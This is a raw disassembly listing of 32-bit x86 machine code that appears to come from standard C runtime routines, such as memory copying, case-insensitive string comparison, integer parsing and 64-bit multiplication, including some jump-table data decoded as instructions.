  4281f6:	jne    0x42820c
  4281f8:	shr    ecx,0x2
  4281fb:	and    edx,0x3
  4281fe:	cmp    ecx,0x8
  428201:	jb     0x42822c
  428203:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428205:	jmp    DWORD PTR [edx*4+0x42831c]
  42820c:	mov    eax,edi
  42820e:	mov    edx,0x3
  428213:	sub    ecx,0x4
  428216:	jb     0x428224
  428218:	and    eax,0x3
  42821b:	add    ecx,eax
  42821d:	jmp    DWORD PTR [eax*4+0x428230]
  428224:	jmp    DWORD PTR [ecx*4+0x42832c]
  42822b:	nop
  42822c:	jmp    DWORD PTR [ecx*4+0x4282b0]
  428233:	nop
  428234:	inc    eax
  428235:	add    BYTE PTR [edx+0x0],0x6c
  428239:	add    BYTE PTR [edx+0x0],0x90
  42823d:	add    BYTE PTR [edx+0x0],0x23
  428241:	ror    DWORD PTR [edx-0x75f877fa],1
  428247:	inc    esi
  428248:	add    DWORD PTR [eax+0x468a0147],ecx
  42824e:	add    al,cl
  428250:	jmp    0x28a0a57
  428255:	add    esi,0x3
  428258:	add    edi,0x3
  42825b:	cmp    ecx,0x8
  42825e:	jb     0x42822c
  428260:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428262:	jmp    DWORD PTR [edx*4+0x42831c]
  428269:	lea    ecx,[ecx+0x0]
  42826c:	and    edx,ecx
  42826e:	mov    al,BYTE PTR [esi]
  428270:	mov    BYTE PTR [edi],al
  428272:	mov    al,BYTE PTR [esi+0x1]
  428275:	shr    ecx,0x2
  428278:	mov    BYTE PTR [edi+0x1],al
  42827b:	add    esi,0x2
  42827e:	add    edi,0x2
  428281:	cmp    ecx,0x8
  428284:	jb     0x42822c
  428286:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428288:	jmp    DWORD PTR [edx*4+0x42831c]
  42828f:	nop
  428290:	and    edx,ecx
  428292:	mov    al,BYTE PTR [esi]
  428294:	mov    BYTE PTR [edi],al
  428296:	add    esi,0x1
  428299:	shr    ecx,0x2
  42829c:	add    edi,0x1
  42829f:	cmp    ecx,0x8
  4282a2:	jb     0x42822c
  4282a4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4282a6:	jmp    DWORD PTR [edx*4+0x42831c]
  4282ad:	lea    ecx,[ecx+0x0]
  4282b0:	adc    eax,DWORD PTR [ebx-0x7cffffbe]
  4282b6:	inc    edx
  4282b7:	add    al,bh
  4282b9:	add    BYTE PTR [edx+0x0],0xf0
  4282bd:	add    BYTE PTR [edx+0x0],0xe8
  4282c1:	add    BYTE PTR [edx+0x0],0xe0
  4282c5:	add    BYTE PTR [edx+0x0],0xd8
  4282c9:	add    BYTE PTR [edx+0x0],0xd0
  4282cd:	add    BYTE PTR [edx+0x0],0x8b
  4282d1:	inc    esp
  4282d2:	mov    fs,esp
  4282d4:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  4282d8:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  4282dc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4282e0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4282e4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4282e8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4282ec:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4282f0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4282f4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4282f8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4282fc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  428300:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  428304:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  428308:	lea    eax,[ecx*4+0x0]
  42830f:	add    esi,eax
  428311:	add    edi,eax
  428313:	jmp    DWORD PTR [edx*4+0x42831c]
  42831a:	mov    edi,edi
  42831c:	sub    al,0x83
  42831e:	inc    edx
  42831f:	add    BYTE PTR [ebx+eax*4],dh
  428322:	inc    edx
  428323:	add    BYTE PTR [eax-0x7d],al
  428326:	inc    edx
  428327:	add    BYTE PTR [ebx+eax*4+0x42],dl
  42832b:	add    BYTE PTR [ebx+0x5f5e0845],cl
  428331:	leave  
  428332:	ret    
  428333:	nop
  428334:	mov    al,BYTE PTR [esi]
  428336:	mov    BYTE PTR [edi],al
  428338:	mov    eax,DWORD PTR [ebp+0x8]
  42833b:	pop    esi
  42833c:	pop    edi
  42833d:	leave  
  42833e:	ret    
  42833f:	nop
  428340:	mov    al,BYTE PTR [esi]
  428342:	mov    BYTE PTR [edi],al
  428344:	mov    al,BYTE PTR [esi+0x1]
  428347:	mov    BYTE PTR [edi+0x1],al
  42834a:	mov    eax,DWORD PTR [ebp+0x8]
  42834d:	pop    esi
  42834e:	pop    edi
  42834f:	leave  
  428350:	ret    
  428351:	lea    ecx,[ecx+0x0]
  428354:	mov    al,BYTE PTR [esi]
  428356:	mov    BYTE PTR [edi],al
  428358:	mov    al,BYTE PTR [esi+0x1]
  42835b:	mov    BYTE PTR [edi+0x1],al
  42835e:	mov    al,BYTE PTR [esi+0x2]
  428361:	mov    BYTE PTR [edi+0x2],al
  428364:	mov    eax,DWORD PTR [ebp+0x8]
  428367:	pop    esi
  428368:	pop    edi
  428369:	leave  
  42836a:	ret    
  42836b:	nop
  42836c:	lea    esi,[ecx+esi*1-0x4]
  428370:	lea    edi,[ecx+edi*1-0x4]
  428374:	test   edi,0x3
  42837a:	jne    0x4283a0
  42837c:	shr    ecx,0x2
  42837f:	and    edx,0x3
  428382:	cmp    ecx,0x8
  428385:	jb     0x428394
  428387:	std    
  428388:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42838a:	cld    
  42838b:	jmp    DWORD PTR [edx*4+0x4284b8]
  428392:	mov    edi,edi
  428394:	neg    ecx
  428396:	jmp    DWORD PTR [ecx*4+0x428468]
  42839d:	lea    ecx,[ecx+0x0]
  4283a0:	mov    eax,edi
  4283a2:	mov    edx,0x3
  4283a7:	cmp    ecx,0x4
  4283aa:	jb     0x4283b8
  4283ac:	and    eax,0x3
  4283af:	sub    ecx,eax
  4283b1:	jmp    DWORD PTR [eax*4+0x4283bc]
  4283b8:	jmp    DWORD PTR [ecx*4+0x4284b8]
  4283bf:	nop
  4283c0:	int3   
  4283c1:	add    DWORD PTR [edx+0x0],0xfffffff0
  4283c5:	add    DWORD PTR [edx+0x0],0x18
  4283c9:	test   BYTE PTR [edx+0x0],al
  4283cc:	mov    al,BYTE PTR [esi+0x3]
  4283cf:	and    edx,ecx
  4283d1:	mov    BYTE PTR [edi+0x3],al
  4283d4:	sub    esi,0x1
  4283d7:	shr    ecx,0x2
  4283da:	sub    edi,0x1
  4283dd:	cmp    ecx,0x8
  4283e0:	jb     0x428394
  4283e2:	std    
  4283e3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4283e5:	cld    
  4283e6:	jmp    DWORD PTR [edx*4+0x4284b8]
  4283ed:	lea    ecx,[ecx+0x0]
  4283f0:	mov    al,BYTE PTR [esi+0x3]
  4283f3:	and    edx,ecx
  4283f5:	mov    BYTE PTR [edi+0x3],al
  4283f8:	mov    al,BYTE PTR [esi+0x2]
  4283fb:	shr    ecx,0x2
  4283fe:	mov    BYTE PTR [edi+0x2],al
  428401:	sub    esi,0x2
  428404:	sub    edi,0x2
  428407:	cmp    ecx,0x8
  42840a:	jb     0x428394
  42840c:	std    
  42840d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42840f:	cld    
  428410:	jmp    DWORD PTR [edx*4+0x4284b8]
  428417:	nop
  428418:	mov    al,BYTE PTR [esi+0x3]
  42841b:	and    edx,ecx
  42841d:	mov    BYTE PTR [edi+0x3],al
  428420:	mov    al,BYTE PTR [esi+0x2]
  428423:	mov    BYTE PTR [edi+0x2],al
  428426:	mov    al,BYTE PTR [esi+0x1]
  428429:	shr    ecx,0x2
  42842c:	mov    BYTE PTR [edi+0x1],al
  42842f:	sub    esi,0x3
  428432:	sub    edi,0x3
  428435:	cmp    ecx,0x8
  428438:	jb     0x428394
  42843e:	std    
  42843f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428441:	cld    
  428442:	jmp    DWORD PTR [edx*4+0x4284b8]
  428449:	lea    ecx,[ecx+0x0]
  42844c:	ins    BYTE PTR es:[edi],dx
  42844d:	test   BYTE PTR [edx+0x0],al
  428450:	je     0x4283d6
  428452:	inc    edx
  428453:	add    BYTE PTR [esp+eax*4+0x42],bh
  428457:	add    BYTE PTR [esp+eax*4-0x7b73ffbe],al
  42845e:	inc    edx
  42845f:	add    BYTE PTR [esp+eax*4-0x7b63ffbe],dl
  428466:	inc    edx
  428467:	add    BYTE PTR [edi-0x74ffbd7c],ch
  42846d:	inc    esp
  42846e:	mov    ds,WORD PTR [ecx+ecx*4]
  428471:	inc    esp
  428472:	(bad)  
  428473:	sbb    al,0x8b
  428475:	inc    esp
  428476:	mov    ds,WORD PTR [eax]
  428478:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42847c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428480:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428484:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428488:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42848c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428490:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428494:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428498:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42849c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  4284a0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  4284a4:	lea    eax,[ecx*4+0x0]
  4284ab:	add    esi,eax
  4284ad:	add    edi,eax
  4284af:	jmp    DWORD PTR [edx*4+0x4284b8]
  4284b6:	mov    edi,edi
  4284b8:	enter  0x4284,0x0
  4284bc:	rol    BYTE PTR [edx+eax*2+0x4284e000],1
  4284c3:	add    ah,dh
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	mov    eax,DWORD PTR [ebp+0x8]
  4284cb:	pop    esi
  4284cc:	pop    edi
  4284cd:	leave  
  4284ce:	ret    
  4284cf:	nop
  4284d0:	mov    al,BYTE PTR [esi+0x3]
  4284d3:	mov    BYTE PTR [edi+0x3],al
  4284d6:	mov    eax,DWORD PTR [ebp+0x8]
  4284d9:	pop    esi
  4284da:	pop    edi
  4284db:	leave  
  4284dc:	ret    
  4284dd:	lea    ecx,[ecx+0x0]
  4284e0:	mov    al,BYTE PTR [esi+0x3]
  4284e3:	mov    BYTE PTR [edi+0x3],al
  4284e6:	mov    al,BYTE PTR [esi+0x2]
  4284e9:	mov    BYTE PTR [edi+0x2],al
  4284ec:	mov    eax,DWORD PTR [ebp+0x8]
  4284ef:	pop    esi
  4284f0:	pop    edi
  4284f1:	leave  
  4284f2:	ret    
  4284f3:	nop
  4284f4:	mov    al,BYTE PTR [esi+0x3]
  4284f7:	mov    BYTE PTR [edi+0x3],al
  4284fa:	mov    al,BYTE PTR [esi+0x2]
  4284fd:	mov    BYTE PTR [edi+0x2],al
  428500:	mov    al,BYTE PTR [esi+0x1]
  428503:	mov    BYTE PTR [edi+0x1],al
  428506:	mov    eax,DWORD PTR [ebp+0x8]
  428509:	pop    esi
  42850a:	pop    edi
  42850b:	leave  
  42850c:	ret    
  42850d:	push   ebp
  42850e:	mov    ebp,esp
  428510:	sub    esp,0xc
  428513:	mov    eax,ds:0x4669f0
  428518:	xor    eax,DWORD PTR [ebp+0x4]
  42851b:	and    BYTE PTR [ebp-0x6],0x0
  42851f:	push   0x6
  428521:	mov    DWORD PTR [ebp-0x4],eax
  428524:	lea    eax,[ebp-0xc]
  428527:	push   eax
  428528:	push   0x1004
  42852d:	push   DWORD PTR [ebp+0x8]
  428530:	call   DWORD PTR ds:0x429060
  428536:	test   eax,eax
  428538:	jne    0x42853f
  42853a:	or     eax,0xffffffff
  42853d:	jmp    0x428549
  42853f:	lea    eax,[ebp-0xc]
  428542:	push   eax
  428543:	call   0x42884e
  428548:	pop    ecx
  428549:	mov    ecx,DWORD PTR [ebp-0x4]
  42854c:	xor    ecx,DWORD PTR [ebp+0x4]
  42854f:	call   0x42595c
  428554:	leave  
  428555:	ret    
  428556:	push   0x38
  428558:	push   0x429f08
  42855d:	call   0x425290
  428562:	mov    eax,ds:0x4669f0
  428567:	xor    eax,DWORD PTR [ebp+0x4]
  42856a:	mov    DWORD PTR [ebp-0x1c],eax
  42856d:	xor    edi,edi
  42856f:	mov    DWORD PTR [ebp-0x20],edi
  428572:	mov    DWORD PTR [ebp-0x24],edi
  428575:	mov    eax,DWORD PTR [ebp+0x14]
  428578:	mov    ebx,DWORD PTR [eax]
  42857a:	mov    DWORD PTR [ebp-0x28],ebx
  42857d:	mov    DWORD PTR [ebp-0x2c],edi
  428580:	mov    eax,DWORD PTR [ebp+0x8]
  428583:	cmp    eax,DWORD PTR [ebp+0xc]
  428586:	je     0x4286ff
  42858c:	lea    ecx,[ebp-0x40]
  42858f:	push   ecx
  428590:	push   eax
  428591:	mov    esi,DWORD PTR ds:0x4290d8
  428597:	call   esi
  428599:	test   eax,eax
  42859b:	je     0x4285bd
  42859d:	cmp    DWORD PTR [ebp-0x40],0x1
  4285a1:	jne    0x4285bd
  4285a3:	lea    eax,[ebp-0x40]
  4285a6:	push   eax
  4285a7:	push   DWORD PTR [ebp+0xc]
  4285aa:	call   esi
  4285ac:	test   eax,eax
  4285ae:	je     0x4285bd
  4285b0:	cmp    DWORD PTR [ebp-0x40],0x1
  4285b4:	jne    0x4285bd
  4285b6:	mov    DWORD PTR [ebp-0x2c],0x1
  4285bd:	cmp    DWORD PTR [ebp-0x2c],edi
  4285c0:	je     0x4285dc
  4285c2:	cmp    ebx,0xffffffff
  4285c5:	je     0x4285cb
  4285c7:	mov    esi,ebx
  4285c9:	jmp    0x4285d7
  4285cb:	push   DWORD PTR [ebp+0x10]
  4285ce:	call   0x4258a0
  4285d3:	pop    ecx
  4285d4:	mov    esi,eax
  4285d6:	inc    esi
  4285d7:	mov    DWORD PTR [ebp-0x44],esi
  4285da:	jmp    0x4285df
  4285dc:	mov    esi,DWORD PTR [ebp-0x44]
  4285df:	cmp    DWORD PTR [ebp-0x2c],edi
  4285e2:	jne    0x4285fe
  4285e4:	push   edi
  4285e5:	push   edi
  4285e6:	push   ebx
  4285e7:	push   DWORD PTR [ebp+0x10]
  4285ea:	push   0x1
  4285ec:	push   DWORD PTR [ebp+0x8]
  4285ef:	call   DWORD PTR ds:0x429104
  4285f5:	mov    esi,eax
  4285f7:	mov    DWORD PTR [ebp-0x44],esi
  4285fa:	cmp    esi,edi
  4285fc:	je     0x428656
  4285fe:	mov    DWORD PTR [ebp-0x4],edi
  428601:	lea    eax,[esi+esi*1]
  428604:	add    eax,0x3
  428607:	and    eax,0xfffffffc
  42860a:	call   0x4252e0
  42860f:	mov    DWORD PTR [ebp-0x18],esp
  428612:	mov    ebx,esp
  428614:	mov    DWORD PTR [ebp-0x48],ebx
  428617:	lea    eax,[esi+esi*1]
  42861a:	push   eax
  42861b:	push   edi
  42861c:	push   ebx
  42861d:	call   0x427b90
  428622:	add    esp,0xc
  428625:	or     DWORD PTR [ebp-0x4],0xffffffff
  428629:	jmp    0x428642
  42862b:	xor    eax,eax
  42862d:	inc    eax
  42862e:	ret    
  42862f:	mov    esp,DWORD PTR [ebp-0x18]
  428632:	call   0x428725
  428637:	xor    edi,edi
  428639:	xor    ebx,ebx
  42863b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42863f:	mov    esi,DWORD PTR [ebp-0x44]
  428642:	cmp    ebx,edi
  428644:	jne    0x428664
  428646:	push   esi
  428647:	push   0x2
  428649:	call   0x4263a8
  42864e:	pop    ecx
  42864f:	pop    ecx
  428650:	mov    ebx,eax
  428652:	cmp    ebx,edi
  428654:	jne    0x42865d
  428656:	xor    eax,eax
  428658:	jmp    0x428711
  42865d:	mov    DWORD PTR [ebp-0x24],0x1
  428664:	push   esi
  428665:	push   ebx
  428666:	push   DWORD PTR [ebp-0x28]
  428669:	push   DWORD PTR [ebp+0x10]
  42866c:	push   0x1
  42866e:	push   DWORD PTR [ebp+0x8]
  428671:	call   DWORD PTR ds:0x429104
  428677:	test   eax,eax
  428679:	je     0x428702
  42867f:	cmp    DWORD PTR [ebp+0x18],edi
  428682:	je     0x4286a4
  428684:	push   edi
  428685:	push   edi
  428686:	push   DWORD PTR [ebp+0x1c]
  428689:	push   DWORD PTR [ebp+0x18]
  42868c:	push   esi
  42868d:	push   ebx
  42868e:	push   edi
  42868f:	push   DWORD PTR [ebp+0xc]
  428692:	call   DWORD PTR ds:0x429098
  428698:	test   eax,eax
  42869a:	je     0x428702
  42869c:	mov    eax,DWORD PTR [ebp+0x18]
  42869f:	mov    DWORD PTR [ebp-0x20],eax
  4286a2:	jmp    0x428702
  4286a4:	cmp    DWORD PTR [ebp-0x2c],edi
  4286a7:	jne    0x4286bf
  4286a9:	push   edi
  4286aa:	push   edi
  4286ab:	push   edi
  4286ac:	push   edi
  4286ad:	push   esi
  4286ae:	push   ebx
  4286af:	push   edi
  4286b0:	push   DWORD PTR [ebp+0xc]
  4286b3:	call   DWORD PTR ds:0x429098
  4286b9:	mov    esi,eax
  4286bb:	cmp    esi,edi
  4286bd:	je     0x428702
  4286bf:	push   esi
  4286c0:	push   0x1
  4286c2:	call   0x4263a8
  4286c7:	pop    ecx
  4286c8:	pop    ecx
  4286c9:	mov    DWORD PTR [ebp-0x20],eax
  4286cc:	cmp    eax,edi
  4286ce:	je     0x428702
  4286d0:	push   edi
  4286d1:	push   edi
  4286d2:	push   esi
  4286d3:	push   eax
  4286d4:	push   esi
  4286d5:	push   ebx
  4286d6:	push   edi
  4286d7:	push   DWORD PTR [ebp+0xc]
  4286da:	call   DWORD PTR ds:0x429098
  4286e0:	cmp    eax,edi
  4286e2:	jne    0x4286f2
  4286e4:	push   DWORD PTR [ebp-0x20]
  4286e7:	call   0x425e9a
  4286ec:	pop    ecx
  4286ed:	mov    DWORD PTR [ebp-0x20],edi
  4286f0:	jmp    0x428702
  4286f2:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  4286f6:	je     0x428702
  4286f8:	mov    ecx,DWORD PTR [ebp+0x14]
  4286fb:	mov    DWORD PTR [ecx],eax
  4286fd:	jmp    0x428702
  4286ff:	mov    ebx,DWORD PTR [ebp-0x48]
  428702:	cmp    DWORD PTR [ebp-0x24],edi
  428705:	je     0x42870e
  428707:	push   ebx
  428708:	call   0x425e9a
  42870d:	pop    ecx
  42870e:	mov    eax,DWORD PTR [ebp-0x20]
  428711:	lea    esp,[ebp-0x54]
  428714:	mov    ecx,DWORD PTR [ebp-0x1c]
  428717:	xor    ecx,DWORD PTR [ebp+0x4]
  42871a:	call   0x42595c
  42871f:	call   0x4252cb
  428724:	ret    
  428725:	push   ebp
  428726:	mov    ebp,esp
  428728:	sub    esp,0x48
  42872b:	push   ebx
  42872c:	push   esi
  42872d:	push   edi
  42872e:	push   0x4
  428730:	pop    eax
  428731:	call   0x4252e0
  428736:	mov    ebx,esp
  428738:	push   0x1c
  42873a:	lea    eax,[ebp-0x24]
  42873d:	push   eax
  42873e:	push   ebx
  42873f:	call   DWORD PTR ds:0x42903c
  428745:	test   eax,eax
  428747:	je     0x4287ba
  428749:	mov    edi,DWORD PTR [ebp-0x20]
  42874c:	lea    eax,[ebp-0x48]
  42874f:	push   eax
  428750:	call   DWORD PTR ds:0x429040
  428756:	mov    eax,DWORD PTR [ebp-0x44]
  428759:	lea    esi,[eax-0x1]
  42875c:	not    esi
  42875e:	and    esi,ebx
  428760:	sub    esi,eax
  428762:	mov    DWORD PTR [ebp-0x4],eax
  428765:	mov    eax,ds:0x467084
  42876a:	mov    ecx,eax
  42876c:	dec    ecx
  42876d:	neg    ecx
  42876f:	sbb    ecx,ecx
  428771:	and    ecx,0xffff1000
  428777:	add    ecx,0x11000
  42877d:	add    ecx,edi
  42877f:	cmp    esi,ecx
  428781:	jb     0x4287ba
  428783:	cmp    eax,0x1
  428786:	je     0x4287d2
  428788:	mov    ebx,edi
  42878a:	mov    edi,0x1000
  42878f:	push   0x1c
  428791:	lea    eax,[ebp-0x24]
  428794:	push   eax
  428795:	push   ebx
  428796:	call   DWORD PTR ds:0x42903c
  42879c:	test   eax,eax
  42879e:	je     0x4287ba
  4287a0:	add    ebx,DWORD PTR [ebp-0x18]
  4287a3:	test   DWORD PTR [ebp-0x14],edi
  4287a6:	je     0x42878f
  4287a8:	test   BYTE PTR [ebp-0xf],0x1
  4287ac:	mov    ebx,DWORD PTR [ebp-0x24]
  4287af:	je     0x4287b6
  4287b1:	xor    eax,eax
  4287b3:	inc    eax
  4287b4:	jmp    0x4287ee
  4287b6:	cmp    esi,ebx
  4287b8:	jae    0x4287be
  4287ba:	xor    eax,eax
  4287bc:	jmp    0x4287ee
  4287be:	push   0x4
  4287c0:	push   edi
  4287c1:	push   DWORD PTR [ebp-0x4]
  4287c4:	push   ebx
  4287c5:	call   DWORD PTR ds:0x4290e4
  4287cb:	mov    eax,ds:0x467084
  4287d0:	jmp    0x4287d4
  4287d2:	mov    ebx,esi
  4287d4:	dec    eax
  4287d5:	neg    eax
  4287d7:	sbb    eax,eax
  4287d9:	and    eax,0x103
  4287de:	lea    ecx,[ebp-0x8]
  4287e1:	push   ecx
  4287e2:	inc    eax
  4287e3:	push   eax
  4287e4:	push   DWORD PTR [ebp-0x4]
  4287e7:	push   ebx
  4287e8:	call   DWORD PTR ds:0x429024
  4287ee:	lea    esp,[ebp-0x54]
  4287f1:	pop    edi
  4287f2:	pop    esi
  4287f3:	pop    ebx
  4287f4:	leave  
  4287f5:	ret    
  4287f6:	int3   
  4287f7:	int3   
  4287f8:	int3   
  4287f9:	int3   
  4287fa:	int3   
  4287fb:	int3   
  4287fc:	int3   
  4287fd:	int3   
  4287fe:	int3   
  4287ff:	int3   
  428800:	push   ebp
  428801:	mov    ebp,esp
  428803:	push   edi
  428804:	push   esi
  428805:	push   ebx
  428806:	mov    esi,DWORD PTR [ebp+0xc]
  428809:	mov    edi,DWORD PTR [ebp+0x8]
  42880c:	mov    al,0xff
  42880e:	mov    edi,edi
  428810:	or     al,al
  428812:	je     0x428846
  428814:	mov    al,BYTE PTR [esi]
  428816:	add    esi,0x1
  428819:	mov    ah,BYTE PTR [edi]
  42881b:	add    edi,0x1
  42881e:	cmp    ah,al
  428820:	je     0x428810
  428822:	sub    al,0x41
  428824:	cmp    al,0x1a
  428826:	sbb    cl,cl
  428828:	and    cl,0x20
  42882b:	add    al,cl
  42882d:	add    al,0x41
  42882f:	xchg   al,ah
  428831:	sub    al,0x41
  428833:	cmp    al,0x1a
  428835:	sbb    cl,cl
  428837:	and    cl,0x20
  42883a:	add    al,cl
  42883c:	add    al,0x41
  42883e:	cmp    al,ah
  428840:	je     0x428810
  428842:	sbb    al,al
  428844:	sbb    al,0xff
  428846:	movsx  eax,al
  428849:	pop    ebx
  42884a:	pop    esi
  42884b:	pop    edi
  42884c:	leave  
  42884d:	ret    
  42884e:	push   esi
  42884f:	push   edi
  428850:	call   0x425145
  428855:	mov    edi,DWORD PTR [eax+0x64]
  428858:	cmp    edi,DWORD PTR ds:0x466b4c
  42885e:	je     0x428867
  428860:	call   0x4265ef
  428865:	mov    edi,eax
  428867:	mov    esi,DWORD PTR [esp+0xc]
  42886b:	cmp    DWORD PTR [edi+0x28],0x1
  42886f:	movzx  eax,BYTE PTR [esi]
  428872:	jle    0x428882
  428874:	push   0x8
  428876:	push   eax
  428877:	push   edi
  428878:	call   0x4288d6
  42887d:	add    esp,0xc
  428880:	jmp    0x42888c
  428882:	mov    ecx,DWORD PTR [edi+0x48]
  428885:	movzx  eax,BYTE PTR [ecx+eax*2]
  428889:	and    eax,0x8
  42888c:	test   eax,eax
  42888e:	je     0x428893
  428890:	inc    esi
  428891:	jmp    0x42886b
  428893:	movzx  ecx,BYTE PTR [esi]
  428896:	inc    esi
  428897:	cmp    ecx,0x2d
  42889a:	mov    edx,ecx
  42889c:	je     0x4288a3
  42889e:	cmp    ecx,0x2b
  4288a1:	jne    0x4288a7
  4288a3:	movzx  ecx,BYTE PTR [esi]
  4288a6:	inc    esi
  4288a7:	xor    eax,eax
  4288a9:	cmp    ecx,0x30
  4288ac:	jl     0x4288b8
  4288ae:	cmp    ecx,0x39
  4288b1:	jg     0x4288b8
  4288b3:	sub    ecx,0x30
  4288b6:	jmp    0x4288bb
  4288b8:	or     ecx,0xffffffff
  4288bb:	cmp    ecx,0xffffffff
  4288be:	je     0x4288cc
  4288c0:	lea    eax,[eax+eax*4]
  4288c3:	lea    eax,[ecx+eax*2]
  4288c6:	movzx  ecx,BYTE PTR [esi]
  4288c9:	inc    esi
  4288ca:	jmp    0x4288a9
  4288cc:	cmp    edx,0x2d
  4288cf:	pop    edi
  4288d0:	pop    esi
  4288d1:	jne    0x4288d5
  4288d3:	neg    eax
  4288d5:	ret    
  4288d6:	push   ebp
  4288d7:	mov    ebp,esp
  4288d9:	push   ecx
  4288da:	mov    eax,DWORD PTR [ebp+0xc]
  4288dd:	lea    ecx,[eax+0x1]
  4288e0:	cmp    ecx,0x100
  4288e6:	mov    ecx,DWORD PTR [ebp+0x8]
  4288e9:	ja     0x4288f4
  4288eb:	mov    ecx,DWORD PTR [ecx+0x48]
  4288ee:	movzx  eax,WORD PTR [ecx+eax*2]
  4288f2:	jmp    0x428948
  4288f4:	push   esi
  4288f5:	mov    edx,eax
  4288f7:	sar    edx,0x8
  4288fa:	push   edi
  4288fb:	mov    edi,DWORD PTR [ecx+0x48]
  4288fe:	movzx  esi,dl
  428901:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428906:	pop    edi
  428907:	pop    esi
  428908:	je     0x428919
  42890a:	and    BYTE PTR [ebp-0x2],0x0
  42890e:	push   0x2
  428910:	mov    BYTE PTR [ebp-0x3],al
  428913:	mov    BYTE PTR [ebp-0x4],dl
  428916:	pop    eax
  428917:	jmp    0x428923
  428919:	and    BYTE PTR [ebp-0x3],0x0
  42891d:	mov    BYTE PTR [ebp-0x4],al
  428920:	xor    eax,eax
  428922:	inc    eax
  428923:	push   0x1
  428925:	push   DWORD PTR [ecx+0x14]
  428928:	push   DWORD PTR [ecx+0x4]
  42892b:	lea    ecx,[ebp+0xe]
  42892e:	push   ecx
  42892f:	push   eax
  428930:	lea    eax,[ebp-0x4]
  428933:	push   eax
  428934:	push   0x1
  428936:	call   0x4279b8
  42893b:	add    esp,0x1c
  42893e:	test   eax,eax
  428940:	jne    0x428944
  428942:	leave  
  428943:	ret    
  428944:	movzx  eax,WORD PTR [ebp+0xe]
  428948:	and    eax,DWORD PTR [ebp+0x10]
  42894b:	leave  
  42894c:	ret    
  42894d:	int3   
  42894e:	int3   
  42894f:	int3   
  428950:	mov    eax,DWORD PTR [esp+0x8]
  428954:	mov    ecx,DWORD PTR [esp+0x10]
  428958:	or     ecx,eax
  42895a:	mov    ecx,DWORD PTR [esp+0xc]
  42895e:	jne    0x428969
  428960:	mov    eax,DWORD PTR [esp+0x4]
  428964:	mul    ecx
  428966:	ret    0x10
  428969:	push   ebx
  42896a:	mul    ecx
  42896c:	mov    ebx,eax
  42896e:	mov    eax,DWORD PTR [esp+0x8]
  428972:	mul    DWORD PTR [esp+0x14]
  428976:	add    ebx,eax
  428978:	mov    eax,DWORD PTR [esp+0x8]
  42897c:	mul    ecx
  42897e:	add    edx,ebx
  428980:	pop    ebx
  428981:	ret    0x10
  428984:	int3   
  428985:	int3   
  428986:	int3   
  428987:	int3   
  428988:	int3   
  428989:	int3   
  42898a:	int3   
  42898b:	int3   
  42898c:	int3   
  42898d:	int3   
  42898e:	int3   
  42898f:	int3   
  428990:	push   ebp
  428991:	mov    ebp,esp
  428993:	push   edi
  428994:	push   esi
  428995:	push   ebx
  428996:	mov    ecx,DWORD PTR [ebp+0x10]
  428999:	or     ecx,ecx
  42899b:	je     0x4289ea
  42899d:	mov    esi,DWORD PTR [ebp+0x8]
  4289a0:	mov    edi,DWORD PTR [ebp+0xc]
  4289a3:	mov    bh,0x41
  4289a5:	mov    bl,0x5a
  4289a7:	mov    dh,0x20
  4289a9:	lea    ecx,[ecx+0x0]
  4289ac:	mov    ah,BYTE PTR [esi]
  4289ae:	or     ah,ah
  4289b0:	mov    al,BYTE PTR [edi]
  4289b2:	je     0x4289db
  4289b4:	or     al,al
  4289b6:	je     0x4289db
  4289b8:	add    esi,0x1
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,bh
  4289c0:	jb     0x4289c8
  4289c2:	cmp    ah,bl
  4289c4:	ja     0x4289c8
  4289c6:	add    ah,dh
  4289c8:	cmp    al,bh
  4289ca:	jb     0x4289d2
  4289cc:	cmp    al,bl
  4289ce:	ja     0x4289d2
  4289d0:	add    al,dh
  4289d2:	cmp    ah,al
  4289d4:	jne    0x4289e1
  4289d6:	sub    ecx,0x1
  4289d9:	jne    0x4289ac
  4289db:	xor    ecx,ecx
  4289dd:	cmp    ah,al
  4289df:	je     0x4289ea
  4289e1:	mov    ecx,0xffffffff
  4289e6:	jb     0x4289ea
  4289e8:	neg    ecx
  4289ea:	mov    eax,ecx
  4289ec:	pop    ebx
  4289ed:	pop    esi
  4289ee:	pop    edi
  4289ef:	leave  
  4289f0:	ret    
  4289f1:	int3   
  4289f2:	int3   
  4289f3:	int3   
  4289f4:	int3   
  4289f5:	int3   
  4289f6:	int3   
  4289f7:	int3   
  4289f8:	int3   
  4289f9:	int3   
  4289fa:	int3   
  4289fb:	int3   
